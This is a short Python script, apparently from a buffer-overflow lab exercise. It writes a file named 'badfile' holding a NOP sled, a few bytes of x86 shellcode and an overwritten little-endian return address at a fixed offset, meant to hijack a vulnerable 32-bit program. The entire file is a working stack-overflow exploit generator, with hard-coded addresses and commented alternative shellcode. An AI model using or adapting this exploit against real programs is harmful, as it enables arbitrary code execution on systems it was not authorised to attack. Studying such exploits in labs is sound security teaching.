#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
"\xBB\x5D\x63\x55\x56\xFF\xD3"
).encode('latin-1')

#"\xBB\x5D\x63\x55\x56\xFF\xD3"
#"\x31\xC0\x31\xC9\xB0\x44\xB1\x00\x50\x51\xBB\x5D\x63\x55\x56\xFF\xD3"
# Fill the content with NOP's
content = bytearray(0x90 for i in range(800)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 800 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload

ret    = 0xffffd5c8 + 200   # Change this number 

offset = 389+4              # Change this number 
L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 


#for i in range(offset-24,offset+24+4,4):
#	content[i:i + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
